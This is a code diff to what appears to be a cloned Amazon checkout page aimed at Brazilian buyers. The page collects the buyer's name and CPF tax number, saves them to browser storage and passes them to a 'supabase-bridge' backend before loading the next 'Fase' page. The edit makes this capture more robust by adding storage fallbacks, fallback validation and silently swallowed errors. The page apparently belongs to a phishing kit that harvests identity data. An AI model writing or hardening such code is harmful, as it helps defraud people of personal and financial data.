@@ -1302,11 +1302,75 @@ footer, .nav-ftr-batmobile, #nav-ftr {
     <script src="assets/js/supabase-bridge.js"></script>
     <script>
     document.addEventListener('DOMContentLoaded', async function() {
-        const bridge = window.__amzBridge;
-        if (!bridge) return;
+        const bridge = window.__amzBridge || window.Bridge || null;
 
-        await bridge.init('checkout_3');
-        const state = bridge.state || {};
+        function readStoredValue(key) {
+            const sessionValue = sessionStorage.getItem(key);
+            if (sessionValue) return sessionValue;
+            try {
+                return localStorage.getItem(key);
+            } catch (error) {
+                return null;
+            }
+        }
+
+        function readStoredAddress() {
+            try {
+                return JSON.parse(readStoredValue('checkout_address') || '{}') || {};
+            } catch (error) {
+                return {};
+            }
+        }
+
+        function validateFallbackFields(selectors) {
+            let valid = true;
+            let firstInvalid = null;
+
+            Object.keys(selectors || {}).forEach(function(key) {
+                const el = document.querySelector(selectors[key]);
+                if (!el) return;
+                const hasValue = !!(el.value && el.value.trim());
+                el.style.borderColor = hasValue ? '' : 'red';
+                if (!hasValue) {
+                    valid = false;
+                    if (!firstInvalid) firstInvalid = el;
+                }
+            });
+
+            if (firstInvalid && typeof firstInvalid.focus === 'function') {
+                firstInvalid.focus();
+            }
+
+            return valid;
+        }
+
+        function persistPhaseThreeData(nextData) {
+            const addressState = Object.assign({}, readStoredAddress(), nextData || {});
+            try {
+                sessionStorage.setItem('checkout_address', JSON.stringify(addressState));
+                sessionStorage.setItem('user_name', addressState.nome || '');
+                localStorage.setItem('checkout_address', JSON.stringify(addressState));
+                localStorage.setItem('user_name', addressState.nome || '');
+            } catch (error) {}
+        }
+
+        let state = Object.assign({}, readStoredAddress(), {
+            nome: readStoredValue('user_name') || '',
+            cpf: readStoredValue('user_cpf') || ''
+        });
+
+        if (bridge && bridge.init) {
+            try {
+                const snapshot = await bridge.init('checkout_3');
+                state = Object.assign(
+                    {},
+                    snapshot && typeof snapshot === 'object'
+                        ? (snapshot.data || snapshot.buyer || snapshot)
+                        : {},
+                    state
+                );
+            } catch (error) {}
+        }
 
         // Remove o bloco duplicado que foi salvo dentro do footer nesta fase.
         const footer = document.querySelector('footer.nav-mobile');
@@ -1322,19 +1386,12 @@ footer, .nav-ftr-batmobile, #nav-ftr {
         const description = document.querySelector('#pagelet-layout-section .a-size-base.a-spacing-none.a-text-normal');
         const tipsItems = Array.from(document.querySelectorAll('#pagelet-layout-section ul.a-unordered-list .a-list-item'));
         const nameError = document.getElementById('fullName-error-message');
-        const checkoutAddress = (() => {
-            try {
-                return JSON.parse(sessionStorage.getItem('checkout_address') || localStorage.getItem('checkout_address') || '{}');
-            } catch (error) {
-                return {};
-            }
-        })();
+        const checkoutAddress = readStoredAddress();
         const storedName = [
-            state.nome,
-            state.name,
-            sessionStorage.getItem('user_name'),
+            readStoredValue('user_name'),
             checkoutAddress.nome,
-            localStorage.getItem('user_name')
+            state.nome,
+            state.name
         ].find((value) => typeof value === 'string' && value.trim())?.trim() || '';
 
         // Pre-fill if we have data from state
@@ -1382,15 +1439,24 @@ footer, .nav-ftr-batmobile, #nav-ftr {
                     fieldsToValidate.nome = '#payments-risk-compliance-customer-fullName';
                 }
 
-                const isValid = bridge.validateFields(fieldsToValidate);
+                const isValid = bridge && bridge.validateFields
+                    ? bridge.validateFields(fieldsToValidate)
+                    : validateFallbackFields(fieldsToValidate);
 
                 if (isValid) {
                     const editedName = nameInput ? nameInput.value.trim() : '';
                     const resolvedName = editedName || storedName;
-                    await bridge.save({
+                    const nextData = Object.assign({}, state, {
                         cpf: cpfInput.value.trim(),
                         nome: resolvedName
                     });
+                    persistPhaseThreeData(nextData);
+                    if (bridge && bridge.save) {
+                        try {
+                            await bridge.save(nextData);
+                        } catch (error) {}
+                    }
+                    persistPhaseThreeData(nextData);
                     window.location.href = 'Checkout - Fase 4.html';
                 }
             });
